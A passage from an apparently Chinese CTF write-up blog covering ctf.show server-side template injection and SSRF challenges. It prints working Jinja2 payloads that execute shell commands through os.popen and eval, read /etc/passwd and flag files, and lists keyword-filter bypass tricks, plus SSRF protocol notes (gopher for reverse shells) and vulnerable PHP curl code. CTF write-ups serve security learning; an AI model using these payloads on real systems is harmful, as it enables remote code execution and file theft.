&#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;posix.stat_result&#x27;&gt;, &lt;type &#x27;posix.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;type &#x27;dict_keys&#x27;&gt;, &lt;type &#x27;dict_items&#x27;&gt;, &lt;type &#x27;dict_values&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;]</span><br><span class="line"></span><br><span class="line"># 获得第40个子类的一个实例，即一个file实例</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40] mappingproxy</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 对file初始化</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;) </span><br><span class="line">&lt;open file &#x27;/etc/passwd&#x27;, mode &#x27;r&#x27; at 0x10397a8a0&gt;</span><br><span class="line"></span><br><span class="line"># 使用file的read属性读取，但发现是个方法</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read</span><br><span class="line">&lt;built-in method read of file object at 0x10397a5d0&gt;</span><br><span class="line"></span><br><span class="line"># 使用read()方法读取</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/etc/passwd&quot;).read()</span><br><span class="line">nobody:*:-2:-2:Unprivileged </span><br><span class="line">User:/var/empty:/usr/bin/false</span><br><span class="line">root:*:0:0:System </span><br><span class="line">Administrator:/var/root:/bin/sh</span><br></pre></td></tr></table></figure><p>[关于python魔术方法payload：&quot;&quot;.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read() 的解释]: <a href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/python/</a></p><p>写一个python脚本带入执行查找flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    //找到了</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//然后cat 就可以</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /tmp/ddddd/2222/flag &quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">//我们可以改里面的命令</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参数呢???</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281906623.png" alt="image-20220328190651574"></p><p>小小fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281917579.png" alt="image-20220328191752524"></p><p>找到个name参数,发现一个xss</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281919739.png" alt="image-20220328191917686"></p><p>不玩了,测试一下ssti</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281920069.png" alt="image-20220328192003008"></p><p>发现存在模板注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得字符串的type实例</span><br><span class="line">?name=&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281921506.png" alt="image-20220328192137444"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得其父类</span><br><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281922424.png" alt="image-20220328192221359"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得父类中的object类</span><br><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281924934.png" alt="image-20220328192427878"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获得object类的子类，但发现这个__subclasses__属性是个方法</span><br><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281925083.png" alt="image-20220328192545009"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用__subclasses__()方法，获得object类的子类</span><br><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281926393.png" alt="image-20220328192626252"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提供 os._wrap_close 中的 popen 函数</span><br><span class="line">?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac ../flag&#x27;).read()&#125;&#125;</span><br><span class="line"># 这种方法的缺点在于需要找到 类 的索引</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281930568.png" alt="image-20220328193058507"></p><p>来个脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         //遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    //找到了</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) &#125;&#125;  //导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//然后cat 就可以</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /tmp/ddddd/2222/flag &quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">//我们可以改里面的命令</span><br></pre></td></tr></table></figure><p>用的时候可以把注释去掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281936748.png" alt="image-20220328193657700"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281937923.png" alt="image-20220328193722883"></p><p>另外的方法</p><p>也可以直接用 <strong>lipsum</strong> 和 cycler 执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac ../flag&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者用控制块去直接执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;))%&#125;</span><br></pre></td></tr></table></figure><h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><h2 id="ssti模板注入绕过"><a href="#ssti模板注入绕过" class="headerlink" title="ssti模板注入绕过"></a>ssti模板注入绕过</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li><code>&#123;%%&#125;</code>可以用来声明变量,当然也可以用于循环语句和条件语句</li><li><code>&#123;undefined&#123;&#125;&#125;</code>用于将表达式打印到模板输出</li><li>&#96;&#96;表示未包含在模板输出中的注释</li><li>##可以有和<code>&#123;%%&#125;</code>相同的效果</li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>除了使用标准的python .(点)之外,还可以使用中括号来访问变量的属性.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure><p>所以过滤了. 我们还可以使用中括号绕过个.如果想调用字典中的键值,其实本质上是调用了魔术方法__getitem__ 所以对于取字典中键值的情况不仅可以使用[],也可以使用__getitm__,当然对于字典来说,我们也可以用他自带的一些方法了.pop就是其中的一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure><p>那么调用对象的方法具体是什么原理呢,其实他调用了魔术方法_<em>getattribute</em>_</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure><p>如果题目过滤了class或者一些关键字,我们就可以通过字符串处理进行拼接了</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li><p>拼接</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;cla&quot;+&quot;ss&quot;</span><br></pre></td></tr></table></figure></li><li><p>反转</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__ssalc__&quot;[::-1]</span><br></pre></td></tr></table></figure><p> 在jinjia2里面,”cla””ss”是等同于”class”的</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</span><br><span class="line">&quot;&quot;[&quot;__ssalc__&quot;][::-1]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</span><br></pre></td></tr></table></figure></li><li><p>ascii转换</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;</span><br><span class="line">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</span><br></pre></td></tr></table></figure></li><li><p>编码绕过</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</span><br></pre></td></tr></table></figure></li><li><p>利用chr函数</p><p> 我们没有办法直接使用chr函数,因此需要通过__builtins__找到它</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>在jinja2里面可以利用~进行拼接</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>大小写转换</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;.lower()]</span><br></pre></td></tr></table></figure></li></ol><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><ol><li><p>attr</p><p> attr用于获取变量</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure><p> 这个大家应该见的比较多了，常见于点号(.)被过滤，或者点号(.)和中括号([])都被过滤的情况</p></li><li><p>format</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;%s, %s!&quot;|format(greeting, name) &#125;&#125; </span><br></pre></td></tr></table></figure><p> 那么我们想要调用__class__就可以用format了</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;</span><br><span class="line">&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]</span><br></pre></td></tr></table></figure></li><li><p>first last random</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Return the first item of a sequence.</span><br><span class="line">Return the last item of a sequence.</span><br><span class="line">Return a random item from the sequence.</span><br></pre></td></tr></table></figure><p> random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__|last()</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure></li><li><p>join</p><p> 多了一种字符串拼接的方法</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure></li><li><p>lower</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;|lower]</span><br></pre></td></tr></table></figure></li><li><p>replace reverse</p><p> 我们可以利用替换和反转还原回我们要用的字符串了</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br></pre></td></tr></table></figure></li><li><p>string</p><p> 功能类似于python内置函数 str有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">(().__class__|string)[0] 出来的是&lt;</span><br></pre></td></tr></table></figure></li><li><p>select unique</p><p> 我们和上面的结合就会发现他们巨大的用处</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">结果如下</span><br><span class="line">&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;</span><br><span class="line"></span><br><span class="line">这样我们会拥有比前面更多的字符来用于拼接</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[15]~</span><br><span class="line">(()|select|string)[20]~</span><br><span class="line">(()|select|string)[6]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]</span><br><span class="line"></span><br><span class="line">得到字符串&quot;__class__&quot;</span><br></pre></td></tr></table></figure></li><li><p>list</p><p> 转换成列表更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>  只是单纯的字符串的话取单个字符方法有限</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(()|select|string)[0]</span><br><span class="line">如果中括号被过滤了，挺难的</span><br><span class="line">但是列表的话就可以用pop取下标了</span><br><span class="line">当然都可以使用__getitem__</span><br><span class="line"></span><br><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure></li></ol><h3 id="获取键值或下标"><a href="#获取键值或下标" class="headerlink" title="获取键值或下标"></a>获取键值或下标</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict[&#x27;__builtins__&#x27;]</span><br><span class="line">dict.__getitem__(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.pop(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.get(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.setdefault(&#x27;__builtins__&#x27;)</span><br><span class="line">list[0]</span><br><span class="line">list.__getitem__(0)</span><br><span class="line">list.pop(0)</span><br></pre></td></tr></table></figure><h3 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__</span><br><span class="line">()[&quot;__class__&quot;]</span><br><span class="line">()|attr(&quot;__class__&quot;)</span><br><span class="line">().__getattribute__(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311649320.png" alt="image-20220331164902207"></p><p>存在模板注入,上面语句之间拿来试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650851.png" alt="image-20220331165002752"></p><p>过滤了啥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;   </span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;         </span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;    </span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311650151.png" alt="image-20220331165047039"></p><p>骗我</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/ctfshow/ctf.show/SSRF/"/>
      <url>/ctfshow/ctf.show/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>SSRF是一种有攻击者构造形成由服务daunt发起请求的一个安全漏洞.一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.(正是因为他是有服务器端发起的,所以它能够请求到与他相连而与外网隔离的内部系统)</p><h2 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h2><ul><li>file_get_contents():将整个文件或一个url所指向的文件读入一个字符串中</li><li>readfile():输出一个文件的内容</li><li>fsockopen():打开一个网络连接或者一个Unix套接字连接</li><li>curl_exec():初始化一个新的会话,返回一个cURL句柄,供curl_setopt()  curl_exec() 和 curl_close()函数使用</li><li>fopen():打开一个文件或者url</li><li>PHP原生类soapclient在触发反序列化时可导致ssrf</li></ul><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><ul><li>file协议:在有回显的情况下,利用file协议可以读取任意文件的内容</li><li>dict协议:泄露安装软件版本信息,查看端口,操作内网redis服务等</li><li>gopher协议:gophar支持发出get post请求.可以先截获get请求包和post请求包,在构造成符合gopher协议的请求.gophar协议是ssrf利用中一个最强大的协议(俗称万能协议).可以用于反弹shell </li><li>http&#x2F;s协议:探测主机内网主机存活</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol><li>让服务端去访问相应的网址</li><li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li><li>可以使用file dict gopher ftp协议进行请求访问相应的文件</li><li>攻击内网web应用(可以向内部任意主机的任意端口发送精心构造的数据包{payload})</li><li>攻击内网应用程序(利用跨协议通讯技术)</li><li>判断内网主机是否存活:方法是访问看是否有端口开放</li><li>Dos攻击(请求大文件,始终保持连接keep-alive always)</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);<span class="comment">#初始化一个curl会话 并将CURLOPT_URL选项将会被设置成这个值,</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">#设置一个curl传输选项 CURLOPT_HEADER启用时会将头文件的信息作为数据输出流输出</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">#CURLOPT_RETURNTRANSFER将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">#执行给定的curl会话</span></span><br><span class="line"><span 